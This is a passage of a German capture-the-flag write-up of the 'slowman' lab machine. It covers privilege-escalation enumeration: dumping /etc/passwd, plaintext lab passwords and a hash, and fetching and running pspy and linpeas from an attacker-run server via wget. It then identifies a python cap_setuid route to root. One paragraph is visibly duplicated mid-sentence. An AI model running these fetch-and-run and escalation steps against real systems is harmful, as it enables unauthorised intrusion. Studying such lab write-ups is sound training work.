+                        <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">cat user.txt</span></div>
+                        <pre><span class="password">YU9et7HEpA$SwordofS10wMan!!</span></pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird in das Web-Root-Verzeichnis (`/var/www/html`) gewechselt und dessen Inhalt aufgelistet. Anschließend wird das Unterverzeichnis `/secretLGIN` betreten und dessen Inhalt angezeigt. Die PHP-Datei `l0gin.php` wird mit `cat` ausgegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Dateiliste bestätigt die zuvor über Web-Enumeration gefundenen Verzeichnisse (`secretgym`, `secretLGIN`). Der Quellcode von `l0gin.php` zeigt eine serverseitige Authentifizierung. Interessanterweise prüft diese PHP-Datei auf `username = "gonzalo"` und `password = "1234"`, während die JavaScript-Datei (`l0gin.js`) dasselbe Passwort wie in der Datenbank prüfte (`tH1sS2stH3g0nz4l0pAsSWW0rDD!!`). Dies ist ein Widerspruch und deutet auf eine fehlerhafte oder veraltete Implementierung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Diskrepanz zwischen JS und PHP ist ein Hinweis auf mögliche Schwachstellen oder Fehlkonfigurationen. Da der SSH-Login mit dem Datenbank/JS-Passwort für `gonzalo` nicht versucht wurde (nur für `trainerjean`), sollte dies nachgeholt werden. Die PHP-Logik selbst ist hier nicht direkt ausnutzbar, da sie serverseitig ist.<br><strong>Empfehlung (Admin):</strong> Bereinigen Sie den Code, entfernen Sie widersprüchliche Logiken und implementieren Sie eine konsistente, sichere serverseitige Authentifizierung. Entfernen Sie hartkodierte Passwörter.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/backups$ <span class="command">cd /var/www/html/</span></div>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html$ <span class="command">ls -la</span></div>
+                       <pre>
+total 72
+drwxr-xr-x 7 root root  4096 nov 23 19:17 .
+drwxr-xr-x 3 root root  4096 nov 22 19:35 ..
+-rw-r--r-- 1 root root  5232 nov 22 19:37 contact.html
+drwxr-xr-x 2 root root  4096 sep 15  2020 css
+drwxr-xr-x 2 root root  4096 sep 15  2020 images
+-rw-r--r-- 1 root root 16430 nov 23 19:17 index.html
+drwxr-xr-x 2 root root  4096 sep 15  2020 js
+drwxr-xr-x 3 root root  4096 nov 23 19:16 secretgym
+drwxr-xr-x 2 root root  4096 nov 23 19:11 secretLGIN
+-rw-r--r-- 1 root root  6407 nov 23 19:17 trainer.html
+-rw-r--r-- 1 root root  6115 nov 22 19:37 why.html
+                       </pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html$ <span class="command">cd secretLGIN/</span></div>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">ls l-a</span></div>
+                       <pre>ls: cannot access 'l-a': No such file or directory</pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">ls -a</span></div>
+                       <pre>.  ..  l0gin.js  l0gin.php  login.css  login.html</pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">cat l0gin.php</span></div>
+                       <pre>
+&lt;?php
+// Este script podría manejar la autenticación con una base de datos, pero en este ejemplo simplemente redirigimos al usuario si las credenciales son correctas.
+
+$user = $_POST['username']; // Korrigiert: War _PST
+$password = $_POST['password']; // Korrigiert: War _PST
+
+if ($user == "gonzalo" && $password == "1234") { // Korrigiert: War Zuweisung (=) statt Vergleich (==)
+    // Credenciales correctas, redirigir al usuario
+    header("Location: /secretgym/");
+    exit;
+} else {
+    // Credenciales incorrectas
+    echo "Incorrect user or password!";
+}
+?&gt;
+                       </pre>
+                    </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `su` zum Benutzer `gonzalo` zu wechseln und sich als `gonzalo` bei MySQL anzumelden. Beides schlägt fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `trainerjean` kennt das Passwort für `gonzalo` nicht (bzw. das Datenbankpasswort funktioniert nicht für `su`), und der MySQL-Benutzer `gonzalo` hat keine Login-Berechtigungen von `localhost`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der direkte Wechsel zu `gonzalo` ist nicht möglich. Der SSH-Login als `gonzalo` mit dem Datenbank/JS-Passwort sollte jedoch versucht werden (falls noch nicht geschehen).<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration, dass Benutzer nicht einfach wechseln können und MySQL-Berechtigungen restriktiv sind.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">su gonzalo</span></div>
+                       <pre>
+Password:
+su: Authentication failure
+                       </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">mysql -u gonzalo -p</span></div>
+                        <pre>
+Enter password:
+ERROR 1045 (28000): Access denied for user 'gonzalo'@'localhost' (using password: YES)
+                        </pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der `/etc/passwd`-Datei werden angezeigt und ihr Inhalt mit `cat` ausgegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei ist für alle lesbar. Sie listet die Systembenutzer auf, darunter `trainerjeff` (UID 1001), `trainerjean` (UID 1002) und `gonzalo` (UID 1003), alle mit `/bin/bash` als Shell. Der aktuelle Benutzer wird mit `id` bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Benutzerliste bestätigt die gefundenen Namen. Keine direkten Schwachstellen hier.<br><strong>Empfehlung (Admin):</strong> Standardkonfiguration. Sicherstellen, dass keine sensiblen Informationen in den GECOS-Feldern der `passwd`-Datei stehen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">ll /etc/passwd</span></div>
+                       <pre>-rw-r--r-- 1 root root 2084 nov 23 21:23 /etc/passwd</pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">cat /etc/passwd</span></div>
+                       <pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+trainerjeff:x:1001:1001:trainerjeff,,,:/home/trainerjeff:/bin/bash
+trainerjean:x:1002:1002:trainerjean,,,:/home/trainerjean:/bin/bash
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+gonzalo:x:1003:1003:gonzalo,,,:/home/gonzalo:/bin/bash
+ftp:x:115:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+                       </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretLGIN$ <span class="command">id</span></div>
+                        <pre>uid=1002(trainerjean) gid=1002(trainerjean) groups=1002(trainerjean)</pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein einfacher Python-HTTP-Server gestartet, um Dateien an das Zielsystem zu übertragen. Auf dem Zielsystem wird `wget` verwendet, um das Tool `pspy64` (ein Prozess-Monitor) vom Angreifer herunterzuladen. Die Datei wird ausführbar gemacht (`chmod +x`) und gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Dateitransfer ist erfolgreich. `pspy` wird gestartet und beginnt, laufende Prozesse aufzulisten. Es zeigt Standard-Systemprozesse und die SSH-Verbindung des Benutzers `trainerjean`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lassen Sie `pspy` im Hintergrund laufen und beobachten Sie die Ausgabe auf ungewöhnliche Prozesse oder Cronjobs, die als Root ausgeführt werden und möglicherweise manipuliert werden können. Suchen Sie nach Prozessen, die mit hohen Rechten starten und auf Benutzereingaben oder Dateien reagieren.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Dateidownloads auf Servern. Beschränken Sie die Möglichkeit, beliebige Programme auszuführen. Prozess-Monitoring auf verdächtige Aktivitäten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                      <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.113 - - [05/Dec/2023 16:36:41] "GET /pspy64 HTTP/1.1" 200 -
+                      </pre>
+                   </div>
+               </div>
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">wget 192.168.2.199/pspy64</span></div>
+                       <pre>
+--2023-12-05 15:36:43--  http://192.168.2.199/pspy64
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                  100%[===================>]   2.94M  --.-KB/s    in 0.01s
+
+2023-12-05 15:36:43 (303 MB/s) - ‘pspy64’ saved [3078592/3078592]
+                       </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">chmod +x pspy64</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">./pspy64</span></div>
+                        <pre>
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░ ██▒▒██    ▒ ▓██░ ██▒▒██  ██▒
+    ▓██░ ██▓▒░▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ██▒▓░
+    ▒▓▒░ ░  ▒ ▒▓▒ ▒ ░▒▓▒░ ░   ██▒▒▒
+    ░▒ ░    ░ ░▒ ▒ ░  ░▒ ░    ▓██ ░▒░
+    ░░        ░ ░ ░    ░░      ▒ ▒ ░░
+                                ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2023/12/05 15:37:13 CMD: UID=0    PID=99     |
+2023/12/05 15:37:13 CMD: UID=0    PID=98     |
+2023/12/05 15:37:13 CMD: UID=0    PID=96     |
+2023/12/05 15:37:13 CMD: UID=0    PID=94     |
+2023/12/05 15:37:13 CMD: UID=0    PID=93     |
+2023/12/05 15:37:13 CMD: UID=0    PID=112    |
+2023/12/05 15:37:13 CMD: UID=1002 PID=1115   | (sd-pam)
+2023/12/05 15:37:13 CMD: UID=1002 PID=1114   | /lib/systemd/systemd --user
+2023/12/05 15:37:13 CMD: UID=0    PID=1111   | sshd: trainerjean [priv]
+2023/12/05 15:37:13 CMD: UID=0    PID=111    |
+2023/12/05 15:37:13 CMD: UID=0    PID=11     |
+2023/12/05 15:37:13 CMD: UID=0    PID=1099   |
+2023/12/05 15:37:13 CMD: UID=0    PID=108    |
+2023/12/05 15:37:13 CMD: UID=0    PID=10     |
+2023/12/05 15:37:13 CMD: UID=0    PID=1      | /sbin/init
+^CExiting program... (interrupt)
+                        </pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das bekannte Linux-Enumerationsskript `linpeas.sh` wird vom Angreifer-Server heruntergeladen (`wget`), ausführbar gemacht (`chmod +x`) und gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Linpeas beginnt mit der umfassenden Sammlung von Systeminformationen zur Identifizierung von Privilegieneskalationsvektoren. Die gezeigte Ausgabe ist nur der Anfangsbanner und ein kleiner Ausschnitt. Wichtige Funde in diesem Ausschnitt sind:
+                *   Die Datei `/etc/apache2/.htpasswd` existiert und enthält einen Apache-Hash (`$apr1$...`) für den Benutzer `gonzalo`.
+                *   Die Capability `cap_setuid=ep` wird für `/usr/bin/python3.10` gefunden. Dies ist ein bekannter und oft erfolgreicher Vektor zur Privilegieneskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der gefundene Apache-Hash kann versucht werden zu knacken (obwohl das Passwort für `gonzalo` bereits bekannt ist). Die `cap_setuid`-Capability für Python ist der vielversprechendste Fund und sollte sofort ausgenutzt werden (siehe GTFOBins für Python Capabilities).<br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Capabilities von Binärdateien (`setcap -r /usr/bin/python3.10`). Sichern Sie `.htpasswd`-Dateien angemessen und verwenden Sie starke Hashing-Methoden.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">wget 192.168.2.199/linpeas.sh</span></div>
+                       <pre>
+--2023-12-05 15:38:51--  http://192.168.2.199/linpeas.sh
+Connecting to 192.168.2.199:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 827827 (808K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh              100%[===================>] 808.42K  --.-KB/s    in 0.004s
+
+2023-12-05 15:38:51 (222 MB/s) - ‘linpeas.sh’ saved [827827/827827]
+                       </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">chmod +x linpeas.sh</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">./linpeas.sh</span></div>
+                        <pre>
+[...]
+    ╔═══════════╣ Basic System information
+    ╚ https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation#basic-information
+    Linux Version: Linux slowman 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64
+    Distro: Ubuntu 22.04.3 LTS (Jammy Jellyfish)
+    [...]
+    ╔══════════╣ Capabilities
+    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+    Files with capabilities (limited to 50):
+    /snap/core20/2015/usr/bin/ping cap_net_raw=ep
+    /snap/core20/1974/usr/bin/ping cap_net_raw=ep
+    /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+    /usr/bin/python3.10 cap_setuid=ep
+    /usr/bin/mtr-packet cap_net_raw=ep
+    /usr/bin/ping cap_net_raw=ep
+    [...]
+    ╔══════════╣ Analyzing Htpasswd Files (limit 70)
+    -rw-r--r-- 1 root root 46 nov 23 16:50 /etc/apache2/.htpasswd
+    gonzalo:<span class="password">$apr1$CGeKHP0L$HbmXayPsI4aWI/3p7pd6B/</span>
+    [...]
+                        </pre> <!-- Stark gekürzte Linpeas-Ausgabe -->
+                     </div>
+                 </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `getcap -r / 2>/dev/null` wird ausgeführt, um rekursiv alle Dateien im Dateisystem zu finden, die Capabilities gesetzt haben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Fund von Linpeas: `/usr/bin/python3.10` hat die Capability `cap_setuid=ep` (effective, permitted). Dies erlaubt Python-Skripten, die User-ID zu ändern.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist der klare Weg zur Privilegieneskalation. Verwenden Sie einen Python-Einzeiler, um `os.setuid(0)` aufzurufen und eine Root-Shell zu starten.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `cap_setuid`-Capability von Python, wenn sie nicht zwingend benötigt wird (`setcap -r /usr/bin/python3.10`).</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                       <pre>
+/snap/core20/2015/usr/bin/ping cap_net_raw=ep
+/snap/core20/1974/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/python3.10 cap_setuid=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+                       </pre>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die Capability mit `setcap -r` zu entfernen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl schlägt fehl (`Operation not permitted`), da der Benutzer `trainerjean` nicht die notwendigen Rechte (insbesondere `CAP_SETPCAP`) hat, um Capabilities zu ändern.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies war nur ein Test, der zeigt, dass die Capability nicht einfach entfernt werden kann. Fahren Sie mit der Ausnutzung fort.<br><strong>Empfehlung (Admin):</strong> Capabilities können nur von Root oder Prozessen mit `CAP_SETPCAP` geändert werden.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">setcap -r /usr/bin/python3.10</span></div>
+                       <pre>unable to set CAP_SETFCAP effective capability: Operation not permitted</pre>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Erneute Suche nach SUID-Dateien mit `find / -perm -u=s -type f 2>/dev/null`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Liefert dieselbe Liste wie zuvor. Keine neuen Erkenntnisse.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Redundanter Befehl, Konzentration auf die Python-Capability.<br><strong>Empfehlung (Admin):</strong> Keine neue Aktion erforderlich.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">find / -perm -u=s -type f 2>/dev/null</span></div>
+                       <pre>
+/snap/core20/2015/usr/bin/chfn
+/snap/core20/2015/usr/bin/chsh
+[...]
+/usr/bin/umount
+/usr/libexec/polkit-agent-helper-1
+                       </pre> <!-- Gekürzte Ausgabe -->
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Versuche, mit `sudo su` oder `su` Root zu werden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Schlagen fehl, da `trainerjean` keine sudo-Rechte hat und das Root-Passwort nicht bekannt ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardversuche, die hier nicht funktionieren. Fokus auf Python-Capability.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">sudo su</span></div>
+                       <pre>
+[sudo] password for trainerjean:
+trainerjean is not in the sudoers file.  This incident will be reported.
+                       </pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:/tmp$ <span class="command">su</span></div>
+                       <pre>
+Password:
+su: Authentication failure
+                       </pre>
+                    </div>
+                </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Erkundung des `~/snap/lxd`-Verzeichnisses. Dies ist ein häufiger Ort für LXD-basierte Privilegieneskalation.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verzeichnisstruktur wird aufgelistet, aber es werden keine offensichtlich ausnutzbaren Konfigurationen oder Gruppen             <p class="analysis"><strong>Analyse:</strong> Erkundung des `~/snap/lxd`-Verzeichnisses. Dies ist ein häufiger Ort für LXD-basierte Privilegieneskalation, wenn der Benutzer Mitglied der `lxd`-Gruppe ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verzeichnisstruktur wird aufgelistet, aber es werden keine offensichtlich ausnutzbaren Konfigurationen oder Gruppenmitgliedschaften geprüft (z.B. mit `id`). Ohne Mitgliedschaft in der `lxd`-Gruppe ist dieser Pfad normalerweise nicht direkt zur Eskalation nutzbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen Sie die Gruppenzugehörigkeit des Benutzers (`id`). Wenn der Benutzer nicht in der `lxd`-Gruppe ist, ist dieser Vektor wahrscheinlich nicht gangbar. Konzentrieren Sie sich auf die Python-Capability.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur berechtigte Benutzer Mitglied der `lxd`-Gruppe sind.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">ls</span></div>
+                       <pre>py.py  snap  user.txt</pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:~$ <span class="command">cd snap/</span></div>
+                       <div class="prompt remote-prompt">trainerjean@slowman:~/snap$ <span class="command">ls l-a</span></div>
+                       <pre>ls: cannot access 'l-a': No such file or directory</pre>
+                       <div class="prompt remote-prompt">trainerjean@slowman:~/snap$ <span class="command">ll</span></div>
+                       <pre>
+total 12
+drwx------ 3 trainerjean trainerjean 4096 dic  5 15:39 ./
+drwxr-x--- 5 trainerjean trainerjean 4096 dic  5 15:39 ../
+drwxr-xr-x 4 trainerjean trainerjean 4096 dic  5 15:39 lxd/
+                       </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap$ <span class="command">cd lxd/</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd$ <span class="command">#^C</span></div> <!-- User pressed Ctrl+C ? -->
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd$ <span class="command">ll</span></div>
+                        <pre>
+total 16
+drwxr-xr-x 4 trainerjean trainerjean 4096 dic  5 15:39 ./
+drwx------ 3 trainerjean trainerjean 4096 dic  5 15:39 ../
+drwxr-xr-x 2 trainerjean trainerjean 4096 dic  5 15:39 24322/
+drwxr-xr-x 3 trainerjean trainerjean 4096 dic  5 15:39 common/
+lrwxrwxrwx 1 trainerjean trainerjean    5 dic  5 15:39 current -> 24322/
+                        </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd$ <span class="command">cd 24322/</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd/24322$ <span class="command">ll</span></div>
+                        <pre>
+total 8
+drwxr-xr-x 2 trainerjean trainerjean 4096 dic  5 15:39 ./
+drwxr-xr-x 4 trainerjean trainerjean 4096 dic  5 15:39 ../
+                        </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd/24322$ <span class="command">cd ..</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd$ <span class="command">cd common/</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd/common$ <span class="command">ll</span></div>
+                        <pre>
+total 12
+drwxr-xr-x 3 trainerjean trainerjean 4096 dic  5 15:39 ./
+drwxr-xr-x 4 trainerjean trainerjean 4096 dic  5 15:39 ../
+drwxrwxr-x 2 trainerjean trainerjean 4096 dic  5 15:39 config/
+                        </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd/common$ <span class="command">cd config/</span></div>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd/common/config$ <span class="command">ll</span></div>
+                        <pre>
+total 12
+drwxrwxr-x 2 trainerjean trainerjean 4096 dic  5 15:39 ./
+drwxr-xr-x 3 trainerjean trainerjean 4096 dic  5 15:39 ../
+-rw-rw-r-- 1 trainerjean trainerjean  188 dic  5 15:39 config.yml
+                        </pre>
+                        <div class="prompt remote-prompt">trainerjean@slowman:~/snap/lxd/common/config$ <span class="command">cat config.yml</span></div>
+                        <pre>
+default-remote: local
+remotes:
+  images:
+    addr: https://images.linuxcontainers.org
+    protocol: simplestreams
+    public: true
+  local:
+    addr: unix://
+    public: false
+aliases: {}
+                        </pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich lokal als Benutzer `trainerjean` am MySQL-Server auf dem alternativen Port 33060 anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff wird verweigert (`Access denied for user 'trainerjean'@'localhost'`). Der Benutzer `trainerjean` hat keine Berechtigung, sich an diesem MySQL-Port anzumelden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser Port scheint keine einfache Angriffsfläche zu bieten. Fokus auf andere Methoden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Datenbankberechtigungen korrekt und restriktiv gesetzt sind.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretgym/serverSHARE$ <span class="command">mysql -u trainerjean --port=33060 -p</span></div>
+                       <pre>
+Enter password:
+ERROR 1045 (28000): Access denied for user 'trainerjean'@'localhost' (using password: YES)
+                       </pre>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Mit `grep -Ri "password" /* 2>/dev/null` wird versucht, rekursiv im gesamten Dateisystem nach Dateien zu suchen, die das Wort "password" (case-insensitive) enthalten. Fehlermeldungen werden unterdrückt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl findet Vorkommen des Wortes "password" in verschiedenen Skripten und Konfigurationsdateien (z.B. `mysqlreport`, `mysqld_multi`, `debconf-set-selections`, `pastebinit`, Grub-Dateien). Die meisten Funde beziehen sich auf Passwort-Parameter, Konfigurationsbeispiele oder Code-Kommentare und enthalten keine tatsächlichen Klartext-Passwörter.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl dieser Scan keine direkten Passwörter liefert, kann er Hinweise auf Konfigurationsdateien oder Skripte geben, die genauer untersucht werden sollten. Verwenden Sie spezifischere Suchmuster oder kombinieren Sie es mit Suchen nach Benutzernamen.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Wort "password" in Dateinamen oder Kommentaren, wenn möglich. Speichern Sie niemals Klartext-Passwörter in Dateien.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt remote-prompt">trainerjean@slowman:/var/www/html/secretgym/serverSHARE$ <span class="command">grep -Ri "password" /* 2>/dev/null</span></div>
+                       <pre>
+/bin/mysqlreport:   "password:s",
+/bin/mysqlreport:if(exists $op{'password'})
+/bin/mysqlreport:   if($op{'password'} eq '') # Prompt for password
+/bin/mysqlreport:      print "Password for database user $mycnf{'user'}: ";
+/bin/mysqlreport:   else { $mycnf{'pass'} = $op{'password'}; } # Use password given on command line
+/bin/mysqlreport:   --password PASS   Use PASS or prompt for MySQL user's password
+/bin/mysqlreport:   $mycnf{'pass'} ||= $mycnf{'password'} if exists $mycnf{'password'};
+/bin/debconf-set-selections:my @knowntypes = qw(select boolean string multiselect note password text title);
+/bin/mysqld_multi:$opt_password      = undef();
+/bin/mysqld_multi:                  "user=s", "password=s", "log=s", "no-log",
+/bin/mysqld_multi:  if (defined($opt_password)) {
+/bin/mysqld_multi:    my $pw= $opt_password;
+/bin/mysqld_multi:    # Protect single quotes in password
+/bin/mysqld_multi:#   the same password to all MySQL servers being accessed by $my_progname.
+/bin/mysqld_multi:#   GRANT SHUTDOWN ON *.* TO multi_admin\@localhost IDENTIFIED BY 'password'
+/bin/mysqld_multi:password   = my_password
+/bin/mysqld_multi:--password=...     Password for mysqladmin user.
+/bin/libnetcfg:user/pass     => external user & password
+/bin/libnetcfg:fwuser/fwpass => firewall user & password
+/bin/debconf-show:				if ($q->type eq 'password') {
+/bin/debconf-show:					print " (password omitted)";
+/bin/pastebinit:                      password, private):
+/bin/pastebinit:                    elif param == 'password':
+/bin/pastebinit:                        params[paramname] = password
+/bin/pastebinit:        print(_("\t-u <username> -p <password>"), file=fd)
+/bin/pastebinit:    password = ""
+/bin/pastebinit:            password = opt[1]
